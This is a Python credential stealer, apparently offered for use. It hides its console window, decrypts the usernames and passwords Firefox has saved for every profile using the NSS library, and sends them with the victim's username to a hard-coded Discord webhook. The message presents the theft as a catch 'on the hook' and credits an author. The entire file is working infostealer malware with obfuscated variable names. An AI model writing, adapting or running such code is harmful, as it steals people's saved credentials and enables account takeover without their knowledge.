import os
import ctypes as ct
import getpass
import requests
import json
import time
from base64 import b64decode

ct.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def split_message(message, max_length=500):
    return [message[i:i+max_length] for i in range(0, len(message), max_length)]

class NSSDecoder:
    class SECItem(ct.Structure):
        _fields_ = [
            ('type', ct.c_uint),
            ('data', ct.c_char_p),
            ('len', ct.c_uint),
        ]

    def __init__(self):
        self.NSS = self.load_libnss()
        self._set_ctypes()

    def load_libnss(self):
        if os.name == "nt":
            nssname = "nss3.dll"
            locations = (
                "",
                r"C:\Program Files\Mozilla Firefox",
                r"C:\Program Files (x86)\Mozilla Firefox",
            )
        else:
            nssname = "libnss3.so"
            locations = (
                "",
                "/usr/lib",
                "/usr/lib/nss",
                "/usr/lib64",
                "/usr/lib64/nss",
            )

        for loc in locations:
            try:
                nsslib = os.path.join(loc, nssname)
                return ct.CDLL(nsslib)
            except OSError:
                continue
        raise Exception("Could not load NSS library")

    def _set_ctypes(self):
        self.NSS.NSS_Init.argtypes = [ct.c_char_p]
        self.NSS.NSS_Init.restype = ct.c_int
        self.NSS.PK11_GetInternalKeySlot.argtypes = []
        self.NSS.PK11_GetInternalKeySlot.restype = ct.POINTER(self.SECItem)
        self.NSS.PK11SDR_Decrypt.argtypes = [ct.POINTER(self.SECItem), ct.POINTER(self.SECItem), ct.c_void_p]
        self.NSS.PK11SDR_Decrypt.restype = ct.c_int
        self.NSS.SECITEM_ZfreeItem.argtypes = [ct.POINTER(self.SECItem), ct.c_int]
        self.NSS.SECITEM_ZfreeItem.restype = None

    def decode(self, data64):
        data = b64decode(data64)
        inp = self.SECItem(0, data, len(data))
        out = self.SECItem(0, None, 0)

        e = self.NSS.PK11SDR_Decrypt(inp, out, None)
        if e == -1:
            raise Exception("Decryption failed. Master password required.")

        res = ct.string_at(out.data, out.len).decode("utf-8")
        self.NSS.SECITEM_ZfreeItem(out, 0)
        return res

def decrypt_firefox_passwords(profile_dir):
    nss = NSSDecoder()
    nss.NSS.NSS_Init(profile_dir.encode("utf-8"))

    credentials = []
    logins_json = os.path.join(profile_dir, "logins.json")
    if os.path.exists(logins_json):
        with open(logins_json, "r") as f:
            data = json.load(f)
            for login in data.get("logins", []):
                user = nss.decode(login["encryptedUsername"])
                password = nss.decode(login["encryptedPassword"])
                credentials.append({"url": login["hostname"], "username": user, "password": password})

    nss.NSS.NSS_Shutdown()
    return credentials
    
def firefox():
    a = {}
    try:
        firefox_profiles = os.path.expanduser(r'~\AppData\Roaming\Mozilla\Firefox\Profiles')
        if os.path.exists(firefox_profiles):
            for profile in os.listdir(firefox_profiles):
                profile_dir = os.path.join(firefox_profiles, profile)
                a["firefox"] = decrypt_firefox_passwords(profile_dir)
    except Exception as e:
        send_live_message(f"Error gathering credentials: {e}")
    return a
    
def send_live_message(message):
    try:
        t7u8i9 = "https://discord.com/api/webhooks/1375582936719429772/W6saKVoC3pjDtR6ys3kIgxCT7ZW7y1gINFvK-__0ZUqgHmHbXi6_H57DzI72lMKgxhIk"
        if not t7u8i9.startswith("https://discord.com/api/webhooks/"):
            print("❌ Invalid Discord webhook URL.")
            return
        for chunk in split_message(message):
            o0p9i8 = {"content": chunk}
            g5h6j7 = requests.post(t7u8i9, json=o0p9i8, headers={"Content-Type": "application/json"})
            if g5h6j7.status_code != 204:
                print(f"❌ Error sending live message: {g5h6j7.status_code} - {g5h6j7.text}")
            time.sleep(1)
    except Exception as ex:
        print(f"❌ Error sending live message: {ex}")
        
u = getpass.getuser()
a = firefox()
 

m = f'''
----------------------------------------------------------------+
 🤡LMAO🤡
 Wiplash💫
 new catch on the hook😇:
 
 💻user- {u}
 
 credidentials-firefox :
 ----------------------------------------------------------------+

 {json.dumps(a['firefox'], indent=4)}

-----------------------------------------------------------------+

 Program made by enom
 
 ----------------------------------------------------------------+
 '''
 
 
send_live_message(m)
